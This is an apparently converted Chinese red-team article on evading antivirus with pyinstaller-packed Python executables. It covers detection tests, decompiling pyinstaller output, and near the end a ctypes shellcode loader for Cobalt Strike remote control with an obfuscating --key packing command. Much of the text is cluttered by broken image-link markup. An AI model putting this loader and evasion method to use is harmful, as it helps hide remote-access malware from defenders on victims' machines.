> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/10450)

> 先知社区，先知安全技术社区

1. python3 打包的常见方法
------------------

说明：本文`python`为`python3`，打包的库为`pyinstaller`。  
​

`本文的测试时间跨度比较长，文中的方法可能早已失效，感谢大家理解。`

在当前攻防演练中，很多情况下都需要自己动手做一些免杀，在这里本文就以有手就会的`python`语言为例，来一起学习下`python`免杀的那些事。

`python3`程序打包为`exe`文件，目前的主流方法大致分为以下 3 种：  
[2. 文件打包测试](https://cdn.nlark.com/yuque/0/2021/png/8378754/1635500509411-b2945d7a-bd54-47fe-bbff-c24587167314.png#clientId=u493c23e2-26a1-4&from=paste&height=173&id=u0c53b382&margin=%5Bobject%20Object%5D&><img class=)

[2.1 pyinstaller 打包测试](https://cdn.nlark.com/yuque/0/2021/png/8378754/1635500509411-b2945d7a-bd54-47fe-bbff-c24587167314.png#clientId=u493c23e2-26a1-4&from=paste&height=173&id=u0c53b382&margin=%5Bobject%20Object%5D&><img class=)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### [2.1.1 简单的打印输出](https://cdn.nlark.com/yuque/0/2021/png/8378754/1635500509411-b2945d7a-bd54-47fe-bbff-c24587167314.png#clientId=u493c23e2-26a1-4&from=paste&height=173&id=u0c53b382&margin=%5Bobject%20Object%5D&><img class=)

[这里面写一个脚本，就是一个简单的打印输出（`测试时间：2021/05/02`）：](https://cdn.nlark.com/yuque/0/2021/png/8378754/1635500509411-b2945d7a-bd54-47fe-bbff-c24587167314.png#clientId=u493c23e2-26a1-4&from=paste&height=173&id=u0c53b382&margin=%5Bobject%20Object%5D&><img class=)

```
[# -*- encoding: utf-8 -*-
# Time : 2021/05/02 10:14:44
# Author: crow

import os
import time 

while 1:
    print('hello crow')
    time.sleep(2)](https://cdn.nlark.com/yuque/0/2021/png/8378754/1635500509411-b2945d7a-bd54-47fe-bbff-c24587167314.png#clientId=u493c23e2-26a1-4&from=paste&height=173&id=u0c53b382&margin=%5Bobject%20Object%5D&><img class=) 
```

[使用 pyinstaller 进行打包，`pyinstaller`安装只需要使用`pip3 install pyinstaller`就可以安装  
打包的时候只需要使用 `pyinstaller -F 文件名.py` 即可。  
`360`本地扫描（机器联网，但未使用`360`云查杀, `测试时间：2021/05/02`）  
](https://cdn.nlark.com/yuque/0/2021/png/8378754/1635500509411-b2945d7a-bd54-47fe-bbff-c24587167314.png#clientId=u493c23e2-26a1-4&from=paste&height=173&id=u0c53b382&margin=%5Bobject%20Object%5D&><img class=)[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1619921912294-9add7d5b-6dd1-4e82-b4aa-c7afee4378d6.png#height=471&id=HqSxU&margin=%5Bobject%20Object%5D&></a></p><p></p><p><code>windows defender</code> 静态正常，双击可运行，但是会提示是否将文件上传到云端分析 (<code>测试时间：2021/05/02</code>)：</p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1619921854498-446776ec-dcf5-4886-85f5-5ea258a64ef3.png#height=551&id=qqhgv&margin=%5Bobject%20Object%5D&></a><br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1619921901477-2d88a445-16e9-455f-919c-bfe274e12d4c.png#height=305&id=r8SGG&margin=%5Bobject%20Object%5D&></a></p><p></p><p>上传<code>virustotal</code>后测试：（<code>测试时间：2021/05/02</code>）<br>
​</p><p></p><p><code>https://www.virustotal.com/gui/file/c644369f2a8bca67d3a1fa755847a21a35d8339e186393cb4ca36b599c67ffbf/detection</code><br>
​</p><p></p><p>查杀率 <code>7/68</code> ，感觉非常的离谱。<br>
​</p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1635408520096-f513933f-b721-4ddd-a01d-e40a17715c30.png#clientId=u05d8aef4-b967-4&from=paste&height=1964&id=ube05d96c&margin=%5Bobject%20Object%5D&></a></p><p></p><h3 id=)2.1.2 文件处理操作](https://cdn.nlark.com/yuque/0/2021/png/8378754/1619921967691-63979648-ce4f-42e3-a42a-7a30378bde49.png#height=509&id=wJEHL&margin=%5Bobject%20Object%5D&><img class=)

[下面这个脚本主要是以前测试`DLL`劫持的时候，自己写的辅助脚本，内容大概就是对`DLL`文件后缀的进行判断，然后将`DLL`后缀的文件提取出来，再新建一个文件后将其保存下来。  
​](https://cdn.nlark.com/yuque/0/2021/png/8378754/1619921967691-63979648-ce4f-42e3-a42a-7a30378bde49.png#height=509&id=wJEHL&margin=%5Bobject%20Object%5D&><img class=)

```
[# -*- encoding: utf-8 -*-
import re 
path = 'D_Safe_Manage.exe.txt'
new_path = path[:-4] + '_dll.txt'
# print(new_path[:-4])

dlls = []
with open(path, 'r') as f:
    for line in f.readlines():
        # print(line)
        dll_name = re.findall(r'C:\\Windows\\SysWOW64(.*?).dll', line)
        # print(dll_name)
        if dll_name != []:
            dll_names = 'C:\Windows\SysWOW64' + str(dll_name[0]) + '.dll'
            # print(dll_names)
            dlls.append(dll_names)

with open(new_path, 'w') as f:
    for dll in dlls:
        f.write(dll + '\n')](https://cdn.nlark.com/yuque/0/2021/png/8378754/1619921967691-63979648-ce4f-42e3-a42a-7a30378bde49.png#height=509&id=wJEHL&margin=%5Bobject%20Object%5D&><img class=) 
```

[文件打包之后，`360`、`火绒`、`Windows Defender`均报毒。（`测试时间：2021.04.29`）  
​](https://cdn.nlark.com/yuque/0/2021/png/8378754/1619921967691-63979648-ce4f-42e3-a42a-7a30378bde49.png#height=509&id=wJEHL&margin=%5Bobject%20Object%5D&><img class=)

[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1619920569761-e40b4f4a-4635-4a11-8cb8-e7e8a171c008.png#height=484&id=YzakO&margin=%5Bobject%20Object%5D&></a></p><p></p><p>这里的<code>360</code>使用的是<code>本地杀毒</code>。<br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1619920285246-8d0ca947-0f88-43df-8d5f-3aaebd768a39.png#height=474&id=rUodX&margin=%5Bobject%20Object%5D&></a></p><p></p><p>既然<code>exe</code>都被杀，那如果只是单单的<code>py</code>文件呢<br>
测试下：<br>
<code>火绒</code>：<br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1619920634074-505c7b50-54a7-449f-91c7-cf1f03a6348b.png#height=455&id=bVRCF&margin=%5Bobject%20Object%5D&></a></p><p></p><p><code>windows defender</code>也没有报毒<br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1619920915941-df4df039-09f8-445b-8cb6-9a1d84070a32.png#height=495&id=X5EBG&margin=%5Bobject%20Object%5D&></a></p><p></p><p><code>360</code>对<code>py</code>脚本无感，<code>火绒</code>和<code>df</code>会对<code>py</code>有检测，那这说明可能<code>pyinstaller</code>打包之后的文件的一些特征触发了相关的检测规则，而且其特征已经被某些<code>av</code>纳入了病毒特征，就像易语言打包的<code>exe</code>程序都会被杀一样。</p><p></p><p><code>vt</code>测试打包之后的<code>exe</code>文件：<br>
​</p><p></p><p><code>https://www.virustotal.com/gui/file/0b418052f4ac12c80a7a6a140818d317513a5442fed700b4e67ebee58079f9b6/detection</code><br>
​</p><p></p><p>报毒<code>56/69</code>，非常的离谱。。。。<br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1619922286187-3dd31e8e-e643-4862-993b-377ad80f2fd8.png#height=936&id=OFHMl&margin=%5Bobject%20Object%5D&></a></p><p></p><h2 id=)2.2 py2exe 打包测试](https://cdn.nlark.com/yuque/0/2021/png/8378754/1619920189430-08e61543-331c-4ab0-8ff1-1c0d65cd60ff.png#height=490&id=ZBQJt&margin=%5Bobject%20Object%5D&><img class=)

### [2.2.1 py2exe 安装](https://cdn.nlark.com/yuque/0/2021/png/8378754/1619920189430-08e61543-331c-4ab0-8ff1-1c0d65cd60ff.png#height=490&id=ZBQJt&margin=%5Bobject%20Object%5D&><img class=)

[直接使用 `pip3 install py2exe` 我的本地环境是`python3 3.6.5 64位`  
](https://cdn.nlark.com/yuque/0/2021/png/8378754/1619920189430-08e61543-331c-4ab0-8ff1-1c0d65cd60ff.png#height=490&id=ZBQJt&margin=%5Bobject%20Object%5D&><img class=)[2.2.2 py2exe 打包测试](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623823392224-10f42d03-1f49-40b4-a3a4-64c1249fed8e.png#height=396&id=ua6361f90&margin=%5Bobject%20Object%5D&><img class=)

[这时候对于一个普通的文件进行打包测试 `test_py2.py`（`测试时间：2021/06/16`）  
这个脚本输出只是一个`hello world`](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623823392224-10f42d03-1f49-40b4-a3a4-64c1249fed8e.png#height=396&id=ua6361f90&margin=%5Bobject%20Object%5D&><img class=)

```
[# -*- encoding: utf-8 -*-
# Time : 2021/04/29 09:17:37
# Author: crow


while True:
    print('hello world')](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623823392224-10f42d03-1f49-40b4-a3a4-64c1249fed8e.png#height=396&id=ua6361f90&margin=%5Bobject%20Object%5D&><img class=) 
```

[然后设置一个文件 `setup.py`](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623823392224-10f42d03-1f49-40b4-a3a4-64c1249fed8e.png#height=396&id=ua6361f90&margin=%5Bobject%20Object%5D&><img class=)

```
[# -*- encoding:utf-8 -*-

from distutils.core import setup
import py2exe

INCLUDES = []

options = {
    "py2exe" :
        {
            "compressed" : 1, # 压缩   
            "optimize" : 2,
            "bundle_files" : 1, # 所有文件打包成一个 exe 文件  
            "includes" : INCLUDES,
            "dll_excludes" : ["MSVCR100.dll"]
        }
}


setup(
    options=options,    
    description = "this is a py2exe test",   
    zipfile=None,
    console = [{"script":'test_py2.py'}])](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623823392224-10f42d03-1f49-40b4-a3a4-64c1249fed8e.png#height=396&id=ua6361f90&margin=%5Bobject%20Object%5D&><img class=) 
```

[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623826412266-48879b3e-7d64-4423-84c5-c9f4afc897b7.png#height=806&id=uf1899437&margin=%5Bobject%20Object%5D&></a><br>
​</p><p></p><p>在<code>dist</code>文件夹下会生成一个<code>test_py2.exe</code>文件<br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623826425343-9753f4d4-030b-4e25-82f3-58e9ee7ba4d0.png#height=512&id=udd72bd2d&margin=%5Bobject%20Object%5D&></a></p><p></p><p>直接运行后只会输出一个<code>hello world</code>而已，在这里就不再本地进行查杀，直接上传<code>vt</code>进行测试：</p><p></p><p><code>VT</code>查杀</p><p></p><p><code>https://www.virustotal.com/gui/file/84c6f02880ec8c959a5bf20e65ca69c1c293b4329c8206cf2f506b394342bfb8</code><br>
​</p><p></p><p>查杀率 <code>6/69</code>，同样非常离谱。。。<br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1635410195171-db888e4e-0ff1-4186-bc48-d784d382f407.png#clientId=u2a9cd9dd-799d-4&from=paste&height=1736&id=uc3270c6a&margin=%5Bobject%20Object%5D&></a><br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1635410207841-f4897c8e-5379-4b0d-b3a3-e641398903bc.png#clientId=u2a9cd9dd-799d-4&from=paste&height=814&id=uaa750a2b&margin=%5Bobject%20Object%5D&></a><br>
​</p><p></p><p>由此可见，<code>py2exe</code>打包的<code>exe</code>文件同样也已经被标记，<code>py</code>打包真的是穷途末路了。</p><p></p><h2 id=)2.3 打包文件总结](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623826384414-feb805c5-4fa9-4beb-b424-6ee187e90692.png#height=272&id=ubbcd4f3d&margin=%5Bobject%20Object%5D&><img class=)

[在`py2exe`打包之后的文件，并不是一个单纯的`exe`文件，不能像`pyinstaller`那样，直接一个`exe`完事，文件必须放在`dist`文件夹下，需要引入第三方的文件才可以执行。`pyinstaller`是比较好的首选方法，所以后续的研究将使用`pyinstaller`进行打包。  
​](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623826384414-feb805c5-4fa9-4beb-b424-6ee187e90692.png#height=272&id=ubbcd4f3d&margin=%5Bobject%20Object%5D&><img class=)

[从第二节已经看出，无论是`pyinstaller`还是`py2exe`，在打包为`exe`的时候，都或多或少被一些杀软标记，但是这也并不代表`python`免杀无路可走，接下来我们用其他的思路来研究下使用`pyinstaller`打包免杀和`pyinstaller`打包的文件如何逆向。  
​](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623826384414-feb805c5-4fa9-4beb-b424-6ee187e90692.png#height=272&id=ubbcd4f3d&margin=%5Bobject%20Object%5D&><img class=)

[本文不会对反序列化、分离免杀、加壳等手法进行讨论，在这里仅仅对最简单的`shellcode`加载方法进行分析，希望本文能够对师傅们有所帮助。](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623826384414-feb805c5-4fa9-4beb-b424-6ee187e90692.png#height=272&id=ubbcd4f3d&margin=%5Bobject%20Object%5D&><img class=)

[注意：这里的 exe 文件反编译指的是对`pyinstraller`打包的文件进行反编译](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623826384414-feb805c5-4fa9-4beb-b424-6ee187e90692.png#height=272&id=ubbcd4f3d&margin=%5Bobject%20Object%5D&><img class=)

[3.1 测试环境](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623826384414-feb805c5-4fa9-4beb-b424-6ee187e90692.png#height=272&id=ubbcd4f3d&margin=%5Bobject%20Object%5D&><img class=)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[操作系统： `windows 10`  
python 版本：`python3.8.7`  
16 进制编辑器：`010 editor`  
exe 反编译工具：`pyinstxtractor.py`  
pyc 反编译工具：`uncompyle6`](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623826384414-feb805c5-4fa9-4beb-b424-6ee187e90692.png#height=272&id=ubbcd4f3d&margin=%5Bobject%20Object%5D&><img class=)

[3.2 pyinstaller 打包程序为 exe](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623826384414-feb805c5-4fa9-4beb-b424-6ee187e90692.png#height=272&id=ubbcd4f3d&margin=%5Bobject%20Object%5D&><img class=)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[首先写一个简单的`python3`脚本  
`01_easy.py`](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623826384414-feb805c5-4fa9-4beb-b424-6ee187e90692.png#height=272&id=ubbcd4f3d&margin=%5Bobject%20Object%5D&><img class=)

```
[# -*- encoding: utf-8 -*-
# Time : 2021/06/17 10:45:45
# Author: crow

import time 

while 1:
    print('hello world')
    time.sleep(1)](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623826384414-feb805c5-4fa9-4beb-b424-6ee187e90692.png#height=272&id=ubbcd4f3d&margin=%5Bobject%20Object%5D&><img class=) 
```

[然后将该程序使用 pyinstaller 打包为 exe 文件  
`pyinstaller -F 01_easy.py`  
​](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623826384414-feb805c5-4fa9-4beb-b424-6ee187e90692.png#height=272&id=ubbcd4f3d&margin=%5Bobject%20Object%5D&><img class=)

[其中 参数 `-F` 是为了将程序打包为一个`exe`文件，而且不产生其他的文件  
](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623826384414-feb805c5-4fa9-4beb-b424-6ee187e90692.png#height=272&id=ubbcd4f3d&margin=%5Bobject%20Object%5D&><img class=)[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623898211469-605fc7a2-27b4-44c8-8e6c-d975d498a8e3.png#height=141&id=NIEzY&margin=%5Bobject%20Object%5D&></a><br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623898246475-f2072a81-e2e5-4ad4-b562-5d82aeda641e.png#height=111&id=XRce3&margin=%5Bobject%20Object%5D&></a><br>
运行试试：<br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623898273165-6d1e9820-7b60-4746-873d-7a7dd4034eb6.png#height=313&id=GxrAF&margin=%5Bobject%20Object%5D&></a><br>
此时程序运行正常，解下来就是反编译了。</p><p></p><h2 id=)3.3 反编译_pyc](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623898187762-612993b4-2f2b-4ebb-849d-796f18f34bda.png#height=486&id=Zzoin&margin=%5Bobject%20Object%5D&><img class=)

[针对`pyinstaller`打包之后的`exe`反编译工具：`pyinstxtractor.py`](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623898187762-612993b4-2f2b-4ebb-849d-796f18f34bda.png#height=486&id=Zzoin&margin=%5Bobject%20Object%5D&><img class=)

[`pyinstaller extractor`是可以提取出`pyinstaller`所创建的`exe`文件为`pyc`格式。](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623898187762-612993b4-2f2b-4ebb-849d-796f18f34bda.png#height=486&id=Zzoin&margin=%5Bobject%20Object%5D&><img class=)

[下载链接：  
](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623898187762-612993b4-2f2b-4ebb-849d-796f18f34bda.png#height=486&id=Zzoin&margin=%5Bobject%20Object%5D&><img class=)[https://sourceforge.net/projects/pyinstallerextractor/](https://sourceforge.net/projects/pyinstallerextractor/)

将需要反编译的`exe`和`pyinstxtractor.py`放到同一个目录下直接运行

`python pyinstxtractor.py 01_easy.exe`

[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623899065443-2b69f496-35fc-492d-84fb-665f0bdd086d.png#height=99&id=BgNtO&margin=%5Bobject%20Object%5D&></a><br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623899082186-dd4a95d4-0d09-4e2d-abde-1ce1afb59dc3.png#height=678&id=ZADuX&margin=%5Bobject%20Object%5D&></a></p><p></p><h2 id=)3.4 pyc 到源码](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623899011917-9c480310-a2b0-461d-937c-60c3d7e350d2.png#height=455&id=Tew94&margin=%5Bobject%20Object%5D&><img class=)

[`pyinstaller`在打包的时候，会将 pyc 文件的前`8`个字节清除，所以后期需要自己添加上去，前四个字节为`python`编译的版本，后四个字节为时间戳。（四个字节的`magic number`、四个字节的`timestamp`）  
所以在这里可以通过`struct`文件来获取其中的信息，再添加到`01_easy`文件里面去](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623899011917-9c480310-a2b0-461d-937c-60c3d7e350d2.png#height=455&id=Tew94&margin=%5Bobject%20Object%5D&><img class=)

[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623900140605-db35350c-0249-45ef-b4e6-ba8a819c01dc.png#height=155&id=sFkdz&margin=%5Bobject%20Object%5D&></a><br>
通过对比可以发现，<code>struct</code>比<code>01_easy</code>多了 8 个字节（<code>这里只是做了一个粗略的解释，具体的原因肯定不是看出来的，有兴趣的师傅可以翻下源码</code>）</p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623900299335-cbf508b3-a05d-441e-99f0-be2a1c280d0c.png#height=814&id=HEVPb&margin=%5Bobject%20Object%5D&></a></p><p></p><p>因此这里可以将这些字节复制插入到<code>01_easy</code>中去。</p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623900469352-dc5c874a-6d6d-458c-86a3-f39ae6fb57b2.png#height=376&id=h1mOM&margin=%5Bobject%20Object%5D&></a><br>
在这里新建了一个文件，将两个进行结合<br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623901006494-69983c56-e58c-409e-b2fd-0adae21e1da1.png#height=308&id=unq1u&margin=%5Bobject%20Object%5D&></a><br>
再将文件保存为<code>01_easy.pyc</code></p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623901173046-0adeb3b4-1ed9-4f71-a0b9-35e5eac61acd.png#height=110&id=vrVlg&margin=%5Bobject%20Object%5D&></a></p><p></p><p>得到<code>pyc</code>文件之后就比较容易后去源代码了，这里有两种方法，一个是在线反编译，另一种是使用<code>uncompyle6</code>（<code>当然，这里的方法不止这两种</code>）<br>
其中在线反编译地址为：<code>[https://tool.lu/pyc](https://tool.lu/pyc)</code><br>
在线反编译效果：<br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623901329948-53205721-d841-4929-b778-a6a5b2f3d2dd.png#height=543&id=QB9lH&margin=%5Bobject%20Object%5D&></a><br>
可以看到这个效果不是很好，有一部分代码并没有成功编译出来</p><p></p><p>那试试<code>uncompyle6</code>，目前可以在 python3 上使用 pip 的方式进行安装<code>pip3 install uncompyle6</code><br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623901404473-57763eba-6438-45c0-b00e-f1d78f99084d.png#height=508&id=yV8DH&margin=%5Bobject%20Object%5D&></a><br>
然后直接使用命令<code>uncompyle6 01_easy.pyc</code><br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623901514405-1ae6490f-ed93-4b55-8b37-8fac7654e286.png#height=293&id=H8cBY&margin=%5Bobject%20Object%5D&></a><br>
可以将文件内容保存到一个文本中<br>
<code>uncompyle6 01_easy.pyc > 01_easy.py</code><br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623901579550-f2b08319-7593-4c9f-9c53-44b17d40241f.png#height=120&id=T7Asa&margin=%5Bobject%20Object%5D&></a><br>
打开之后：<br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623901597598-8625d89f-1de2-463f-b4c6-81539b231f66.png#height=412&id=e2vwq&margin=%5Bobject%20Object%5D&></a><br>
​</p><p></p><p>在使用<code>pyinstaller</code>的时候，可以使用<code>--key</code>参数对生成的 exe 进行加密，在使用这个参数的时候需要<code>pycrypto</code>库，可以通过<code>pip</code>的方式进行安装，但是保不齐安装的时候会出现一些问题，这里就不再对此展开讲解，直接进行使用。</p><p></p><h2 id=)4.1 python 版本的 shellcode](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623900018393-6a52e67e-1d40-4760-ac7e-41072b010de1.png#height=754&id=KbCwi&margin=%5Bobject%20Object%5D&><img class=)

[**什么是 shellcode？**](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623900018393-6a52e67e-1d40-4760-ac7e-41072b010de1.png#height=754&id=KbCwi&margin=%5Bobject%20Object%5D&><img class=)

[在攻击中，`shellcode`是一段用于利用软件漏洞的有效负载，`shellcode`是`16`进制的机器码，以其经常让攻击者获得 shell 而得名。`shellcode`常常使用机器语言编写。 可在寄存器`eip`溢出后，放入一段可让`CPU`执行的`shellcode`机器码，让电脑可以执行攻击者的任意指令。（`来源：百度百科`）  
​](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623900018393-6a52e67e-1d40-4760-ac7e-41072b010de1.png#height=754&id=KbCwi&margin=%5Bobject%20Object%5D&><img class=)

[下面的代码为最基础版本的`shellcode`，配合`Cobalt Strike`使用，可实现远控。](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623900018393-6a52e67e-1d40-4760-ac7e-41072b010de1.png#height=754&id=KbCwi&margin=%5Bobject%20Object%5D&><img class=)

```
[# -*- encoding: utf-8 -*-
# Time : 2021/04/29 11:19:04
# Author: crow


import ctypes

shellcode =  b""
shellcode += b"\x\"


shellcode = bytearray(shellcode)
# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))

# 放入shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
ctypes.c_uint64(ptr), 
    buf, 
    ctypes.c_int(len(shellcode))
)
# 创建一个线程从shellcode防止位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.c_uint64(ptr), 
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.pointer(ctypes.c_int(0))
)
# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623900018393-6a52e67e-1d40-4760-ac7e-41072b010de1.png#height=754&id=KbCwi&margin=%5Bobject%20Object%5D&><img class=) 
```

[在这里直接使用以下参数进行加密混淆：  
​](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623900018393-6a52e67e-1d40-4760-ac7e-41072b010de1.png#height=754&id=KbCwi&margin=%5Bobject%20Object%5D&><img class=)

[`pyinstaller -F --key crow123321 --noconsole py_shellcode.py`  
​](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623900018393-6a52e67e-1d40-4760-ac7e-41072b010de1.png#height=754&id=KbCwi&margin=%5Bobject%20Object%5D&><img class=)

[其中`--key`之后的字符可以自定义  
​](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623900018393-6a52e67e-1d40-4760-ac7e-41072b010de1.png#height=754&id=KbCwi&margin=%5Bobject%20Object%5D&><img class=)

[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623918851451-9df27374-0910-43ad-8a84-3493d78d17f8.png#height=944&id=ggBjm&originHeight=944&originWidth=1922&originalType=binary&ratio=1&status=done&style=none&width=1922)](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623918851451-9df27374-0910-43ad-8a84-3493d78d17f8.png#height=944&id=ggBjm&originHeight=944&originWidth=1922&originalType=binary&ratio=1&status=done&style=none&width=1922)  
[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623918865559-f19a90f0-774d-4bd3-aefb-a8253cdaf87d.png#height=100&id=fmojT&originHeight=100&originWidth=1516&originalType=binary&ratio=1&status=done&style=none&width=1516)](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623918865559-f19a90f0-774d-4bd3-aefb-a8253cdaf87d.png#height=100&id=fmojT&originHeight=100&originWidth=1516&originalType=binary&ratio=1&status=done&style=none&width=1516)

4.2 --key 参数反编译
---------------

同样的，将两个文件放在一起进行逆向得到`pyc`文件  
​

[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623918904474-648bf010-a1d5-4339-b2c8-87998a07aa6b.png#height=216&id=vuDpk&originHeight=216&originWidth=1074&originalType=binary&ratio=1&status=done&style=none&width=1074)](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623918904474-648bf010-a1d5-4339-b2c8-87998a07aa6b.png#height=216&id=vuDpk&originHeight=216&originWidth=1074&originalType=binary&ratio=1&status=done&style=none&width=1074)  
`python pyinstxtractor.py py_shellcode.exe`  
​

[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623918950397-2a21ab3b-70ed-44b4-92be-9e553ad05ad8.png#height=1018&id=Dxxig&originHeight=1018&originWidth=1934&originalType=binary&ratio=1&status=done&style=none&width=1934)](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623918950397-2a21ab3b-70ed-44b4-92be-9e553ad05ad8.png#height=1018&id=Dxxig&originHeight=1018&originWidth=1934&originalType=binary&ratio=1&status=done&style=none&width=1934)  
​

开始报错，但是依旧可以生成相应的文件夹  
​

[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623918977973-462e37bc-94f5-459d-b1f2-258f2be889ac.png#height=222&id=BF6Ec&originHeight=222&originWidth=1482&originalType=binary&ratio=1&status=done&style=none&width=1482)](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623918977973-462e37bc-94f5-459d-b1f2-258f2be889ac.png#height=222&id=BF6Ec&originHeight=222&originWidth=1482&originalType=binary&ratio=1&status=done&style=none&width=1482)[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623918988931-d227dd14-80ee-4ea1-9791-9d8b92b91bf1.png#height=240&id=hGF0G&originHeight=240&originWidth=1308&originalType=binary&ratio=1&status=done&style=none&width=1308)](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623918988931-d227dd14-80ee-4ea1-9791-9d8b92b91bf1.png#height=240&id=hGF0G&originHeight=240&originWidth=1308&originalType=binary&ratio=1&status=done&style=none&width=1308)

[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623919099172-6b9cb130-7f1e-41b5-8829-718ece0c226f.png#height=1620&id=dZULD&originHeight=1620&originWidth=1620&originalType=binary&ratio=1&status=done&style=none&width=1620)](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623919099172-6b9cb130-7f1e-41b5-8829-718ece0c226f.png#height=1620&id=dZULD&originHeight=1620&originWidth=1620&originalType=binary&ratio=1&status=done&style=none&width=1620)

这里使用同样的方法来对这两个文件进行测试，将新生成的文件保存为`shellcode_key.pyc`  
​

[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623919211092-1f9502cd-616f-49bf-8667-0f1fb42796d1.png#height=842&id=ErO85&originHeight=842&originWidth=1328&originalType=binary&ratio=1&status=done&style=none&width=1328)](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623919211092-1f9502cd-616f-49bf-8667-0f1fb42796d1.png#height=842&id=ErO85&originHeight=842&originWidth=1328&originalType=binary&ratio=1&status=done&style=none&width=1328)

`uncompyle6 shellcode_key.pyc`

[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623919285276-afc18e11-35a9-4674-a564-8c536ba4bca3.png#height=896&id=wfk9e&originHeight=896&originWidth=1928&originalType=binary&ratio=1&status=done&style=none&width=1928)](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623919285276-afc18e11-35a9-4674-a564-8c536ba4bca3.png#height=896&id=wfk9e&originHeight=896&originWidth=1928&originalType=binary&ratio=1&status=done&style=none&width=1928)

将文件重定向到`py`文件里面去  
​

